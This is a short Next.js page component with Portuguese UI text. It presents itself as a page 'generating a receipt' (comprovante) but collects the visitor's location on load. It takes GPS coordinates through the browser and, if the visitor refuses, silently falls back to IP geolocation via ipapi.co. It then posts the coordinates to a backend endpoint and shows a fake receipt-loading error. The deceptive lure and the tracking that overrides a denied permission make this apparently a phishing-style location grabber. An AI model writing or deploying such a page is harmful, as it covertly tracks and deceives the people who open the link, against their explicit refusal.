"use client";

import { useEffect, useState } from "react";

export default function Home() {
  const [location, setLocation] = useState<{
    latitude: number;
    longitude: number;
  } | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(true);

  // Estratégia de fallback por IP
  const getLocationByIP = async () => {
    try {
      const response = await fetch("https://ipapi.co/json/");
      const data = await response.json();
      setLocation({ latitude: data.latitude, longitude: data.longitude });
      await sendToBackend(data.latitude, data.longitude);
    } catch (ipError) {
      // setError("Não foi possível obter localização aproximada");
    } finally {
      setIsLoading(false);
    }
  };

  const sendToBackend = async (lat: number, lon: number) => {
    try {
      await fetch("/api/localizacao", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude: lat, longitude: lon }),
      });
    } catch (apiError) {
      console.error("Erro ao enviar localização:", apiError);
    }
  };

  useEffect(() => {
    const handleGeolocation = async () => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const { latitude, longitude } = position.coords;
            setLocation({ latitude, longitude });
            await sendToBackend(latitude, longitude);
            setIsLoading(false);
          },
          async (error) => {
            // Se negar a geolocalização, tenta por IP
            await getLocationByIP();
            // setError("Localização aproximada via IP (precisão menor)");
          }
        );
      } else {
        await getLocationByIP();
      }
    };

    handleGeolocation();
  }, []);

  return (
    <div className="flex items-center justify-center h-screen">
      <div className="text-center">
        <h1 className="text-2xl font-bold">Bem-vindo!</h1>
        {location ? (
          <p>Comprovante: Erro ao carregar comprovante!</p>
        ) : (
          <p>Gerando Comprovante...</p>
        )}
        {error && <p className="text-red-500">{error}</p>}
      </div>
    </div>
  );
}
